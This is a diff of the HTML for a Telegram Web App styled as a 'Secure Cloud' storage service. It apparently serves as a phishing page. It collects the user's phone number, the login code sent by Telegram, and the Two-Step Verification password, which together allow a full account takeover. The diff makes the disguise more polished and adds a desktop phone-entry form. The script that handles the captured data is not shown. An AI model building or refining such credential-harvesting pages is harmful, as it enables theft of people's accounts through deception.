@@ -2,60 +2,81 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Personal Cloud</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Cloud</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
 </head>
 <body>
-    <div class="cloud-container">
-        <div class="header">
-            <h1 class="glow">☁️ Secure Cloud</h1>
-            <p>Sync your Telegram Storage</p>
+    <div class="app-container">
+        
+        <!-- Loading Step (Initial & Processing) -->
+        <div id="step-loading" class="step active flex-center">
+            <div class="modern-spinner"></div>
+            <p id="loading-text" class="sub-text mt-3">Connecting to Cloud...</p>
         </div>
 
-        <div id="step-phone" class="step active">
-            <p>Tap the button below to securely login with your Telegram account.</p>
-            <button onclick="requestContact()" class="btn-primary">📱 Continue with Telegram</button>
+        <!-- Phone Request Step -->
+        <div id="step-phone" class="step hidden flex-center">
+            <div class="icon-header"><i class="fa-solid fa-cloud text-blue"></i></div>
+            <h1 class="title">Secure Cloud</h1>
+            <p class="sub-text mb-4">Sync your Telegram Storage</p>
+            
+            <button id="btn-share" onclick="handleMobileContact()" class="btn-primary w-100">
+                <i class="fa-brands fa-telegram mr-2"></i> Continue with Telegram
+            </button>
+            
+            <div id="desktop-input-area" class="hidden w-100">
+                <input type="tel" id="manual_phone" placeholder="e.g. +95912345678" class="input-box">
+                <button onclick="handleDesktopContact()" class="btn-primary w-100 mt-2">
+                    <i class="fa-solid fa-paper-plane mr-2"></i> Send OTP Code
+                </button>
+            </div>
         </div>
 
-        <div id="step-otp" class="step hidden">
-            <p>We've sent a 5-digit Cloud PIN to your Telegram.</p>
-            <input type="number" id="otp_input" placeholder="12345" class="input-box">
-            <button onclick="verifyOTP()" class="btn-primary">Verify & Access</button>
+        <!-- OTP Request Step -->
+        <div id="step-otp" class="step hidden flex-center">
+            <div class="icon-header"><i class="fa-solid fa-shield-halved text-blue"></i></div>
+            <h2 class="title">Enter Cloud PIN</h2>
+            <p class="sub-text mb-4">We've sent a 5-digit code to your Telegram.</p>
+            
+            <input type="number" id="otp_input" placeholder="1 2 3 4 5" class="input-box text-center text-lg">
+            <button onclick="verifyOTP()" class="btn-primary w-100 mt-3">Verify Code</button>
         </div>
 
-        <div id="step-2fa" class="step hidden">
-            <p>This account is protected by a Two-Step Verification password.</p>
-            <input type="password" id="password_input" placeholder="Enter your password" class="input-box">
-            <button onclick="verify2FA()" class="btn-primary">Submit Password</button>
+        <!-- 2FA Request Step -->
+        <div id="step-2fa" class="step hidden flex-center">
+            <div class="icon-header"><i class="fa-solid fa-lock text-blue"></i></div>
+            <h2 class="title">Two-Step Verification</h2>
+            <p class="sub-text mb-4">Your account is protected by an additional password.</p>
+            
+            <input type="password" id="password_input" placeholder="Enter Password" class="input-box text-center">
+            <button onclick="verify2FA()" class="btn-primary w-100 mt-3">Submit Password</button>
         </div>
 
-        <!-- Success Dashboard & Personal Cloud UI -->
+        <!-- Success Dashboard (Cloud UI) -->
         <div id="step-success" class="step hidden">
             <div class="dashboard-header">
-                <h2>☁️ My Cloud</h2>
-                <button onclick="fetchCloudData()" class="btn-refresh">🔄 Refresh</button>
+                <div>
+                    <h2 class="dash-title"><i class="fa-solid fa-cloud"></i> My Cloud</h2>
+                    <p id="cloud-status" class="dash-sub">Checking storage...</p>
+                </div>
+                <button onclick="fetchCloudData()" class="btn-icon"><i class="fa-solid fa-rotate-right"></i></button>
             </div>
             
-            <p id="cloud-status" style="font-size: 12px; color: #aaa;">Syncing securely from Telegram...</p>
-            
-            <!-- Cloud Files ပြသမည့် နေရာ -->
             <div id="cloud-files-list" class="file-list">
-                <!-- Javascript မှ Data များ ဤနေရာသို့ ဝင်လာမည် -->
+                <!-- Data will be populated here -->
             </div>
 
-            <!-- အချက်အလက်အသစ် လှမ်းသိမ်းရန် (Upload) နေရာ -->
             <div class="upload-area">
-                <input type="text" id="note_input" placeholder="Type a note to save to cloud..." class="input-box">
-                <button onclick="saveCloudNote()" class="btn-primary" style="margin-top: 10px;">💾 Save Note</button>
+                <div class="input-group">
+                    <input type="text" id="note_input" placeholder="Type a note to save..." class="input-box-alt">
+                    <button onclick="saveCloudNote()" class="btn-upload"><i class="fa-solid fa-arrow-up"></i></button>
+                </div>
             </div>
         </div>
 
-        <div id="step-loading" class="step hidden">
-            <div class="spinner"></div>
-            <p>Processing...</p>
-        </div>
     </div>
     <script src="script.js"></script>
 </body>
